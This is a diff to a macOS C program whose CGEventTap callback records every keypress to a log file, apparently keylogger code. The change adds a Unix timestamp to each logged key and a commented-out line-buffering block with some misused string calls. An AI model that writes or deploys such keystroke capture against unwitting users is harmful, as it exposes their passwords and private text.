@@ -50,9 +50,35 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
 
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
+
+    time_t seconds;
+    seconds = time(NULL);
+
+
+
     // This prints the readable key into the log
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    fprintf(logfile, "%ld %s \n", seconds, convertKeyCode(keyCode));
     fflush(logfile);
+
+    /*
+    printf("%d\n", (int) keyCode);
+    // This prints the readable key into the log
+    if((int) keyCode == 76){
+        strncat(line, "\0",cursor);
+        fprintf(logfile, line, '\n');
+        fflush(logfile);
+        // make line empty
+        printf("%s\n", line);
+
+        memset(line, 0, sizeof line);
+        line[0] = '\0';
+        cursor = 0;
+    }
+    else{
+        strncat(line, convertKeyCode(keyCode), cursor++);
+        printf("%s\n", line);
+    }
+    */
 
     return event;
 }
